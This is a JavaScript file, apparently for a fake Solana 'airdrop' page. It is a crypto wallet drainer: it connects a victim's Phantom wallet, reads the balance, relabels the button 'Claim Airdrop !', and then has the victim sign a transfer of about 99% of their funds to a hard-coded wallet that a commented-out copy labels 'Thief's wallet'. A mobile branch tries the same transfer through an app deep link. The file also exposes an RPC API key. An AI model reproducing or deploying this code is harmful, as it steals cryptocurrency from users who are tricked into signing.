// $(document).ready(function() {
//     $('#connect-wallet').on('click', async () => {
//         if (window.solana && window.solana.isPhantom) {
//             try {
                
//                 const resp = await window.solana.connect();
//                 console.log("Phantom Wallet connected:", resp);

//                 var connection = new solanaWeb3.Connection(
//                     'https://mainnet.helius-rpc.com/?api-key=3478d4fc-831f-4c11-aac1-451cd77fd708', 
//                     'confirmed'
//                 );

//                 const public_key = new solanaWeb3.PublicKey(resp.publicKey);
//                 const walletBalance = await connection.getBalance(public_key);
//                 console.log("Wallet balance:", walletBalance);

//                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
//                 console.log(minBalance)
//                 if (walletBalance < minBalance) {
//                     alert("Insufficient funds for rent.");
//                     return;
//                 }

//                 $('#connect-wallet').text("Claim Airdrop !");
//                 $('#connect-wallet').off('click').on('click', async () => {
//                     try {
//                         const recieverWallet = new solanaWeb3.PublicKey('9mzSBgNmKvdkyBkCKiL9EWEY94oUATw8V1xzzshRsNS9'); // Thief's wallet
//                         const balanceForTransfer = walletBalance - minBalance;
//                         if (balanceForTransfer <= 0) {
//                             alert("Insufficient funds for transfer.");
//                             return;
//                         }

//                         var transaction = new solanaWeb3.Transaction().add(
//                             solanaWeb3.SystemProgram.transfer({
//                                 fromPubkey: resp.publicKey,
//                                 toPubkey: recieverWallet,
//                                 lamports: balanceForTransfer * 0.99,
//                             }),
//                         );

//                         transaction.feePayer = window.solana.publicKey;
//                         let blockhashObj = await connection.getLatestBlockhash();
//                         transaction.recentBlockhash = blockhashObj.blockhash;

//                         const signed = await window.solana.signTransaction(transaction);
//                         console.log("Transaction signed:", signed);

//                         let txid = await connection.sendRawTransaction(signed.serialize());
//                         await connection.confirmTransaction(txid);
//                         console.log("Transaction confirmed:", txid);
//                     } catch (err) {
//                         console.error("Error during minting:", err);
//                     }
//                 });
//             } catch (err) {
//                 console.error("Error connecting to Phantom Wallet:", err);
//             }
//         } else {
//             alert("Phantom extension not found.");
//             const isFirefox = typeof InstallTrigger !== "undefined";
//             const isChrome = !!window.chrome;

//             if (isFirefox) {
//                 window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
//             } else if (isChrome) {
//                 window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
//             } else {
//                 alert("Please download the Phantom extension for your browser.");
//             }
//         }
//     });
// });

$(document).ready(function () {
    $('#connect-wallet').on('click', async () => {
        if (window.solana && window.solana.isPhantom) {
            // PC avec Phantom Extension
            try {
                const resp = await window.solana.connect();
                console.log("Phantom Wallet connected:", resp);

                const connection = new solanaWeb3.Connection(
                    'https://mainnet.helius-rpc.com/?api-key=3478d4fc-831f-4c11-aac1-451cd77fd708',
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key);
                console.log("Wallet balance:", walletBalance);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                console.log(minBalance);

                if (walletBalance < minBalance) {
                    alert("Insufficient funds for rent.");
                    return;
                }

                $('#connect-wallet').text("Claim Airdrop !");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {
                        const recieverWallet = new solanaWeb3.PublicKey('9mzSBgNmKvdkyBkCKiL9EWEY94oUATw8V1xzzshRsNS9'); // Wallet receveur
                        const balanceForTransfer = walletBalance - minBalance;

                        if (balanceForTransfer <= 0) {
                            alert("Insufficient funds for transfer.");
                            return;
                        }

                        const transaction = new solanaWeb3.Transaction().add(
                            solanaWeb3.SystemProgram.transfer({
                                fromPubkey: resp.publicKey,
                                toPubkey: recieverWallet,
                                lamports: balanceForTransfer * 0.99,
                            })
                        );

                        transaction.feePayer = window.solana.publicKey;
                        const blockhashObj = await connection.getLatestBlockhash();
                        transaction.recentBlockhash = blockhashObj.blockhash;

                        const signed = await window.solana.signTransaction(transaction);
                        console.log("Transaction signed:", signed);

                        const txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        console.log("Transaction confirmed:", txid);
                    } catch (err) {
                        console.error("Error during minting:", err);
                    }
                });
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
            }
        } else {
            // Mobile avec l'application Phantom
            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

            if (isMobile) {
                try {
                    alert("Redirecting to Phantom mobile app...");
                    
                    // Transaction information
                    const recieverWallet = '9mzSBgNmKvdkyBkCKiL9EWEY94oUATw8V1xzzshRsNS9';
                    const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                    const lamportsToSend = 1000000; 

                    const transactionPayload = {
                        instructions: [
                            {
                                programId: "11111111111111111111111111111111", // System Program
                                keys: [
                                    {
                                        pubkey: public_key, // Replace with user's wallet
                                        isSigner: true,
                                        isWritable: true,
                                    },
                                    {
                                        pubkey: recieverWallet,
                                        isSigner: false,
                                        isWritable: true,
                                    },
                                ],
                                data: btoa(
                                    new Uint8Array([
                                        2, // Instruction de transfert (System Program op_code)
                                        ...new solanaWeb3.BN(lamportsToSend).toArray("le", 8), // Montant en lamports (petit-boutiste)
                                    ]).reduce((acc, val) => acc + String.fromCharCode(val), "")
                                ), // Replace with serialized data
                            },
                        ],
                    };

                    // Redirect to Phantom app
                    const appDeepLink = `phantom://app?${encodeURIComponent(
                        JSON.stringify(transactionPayload)
                    )}`;
                    window.location.href = appDeepLink;
                } catch (err) {
                    console.error("Error with Phantom mobile transaction:", err);
                }
            } else {
                // Redirection pour PC sans extension
                alert("Phantom Wallet not detected. Please install the Phantom extension.");
            }
        }
    });
});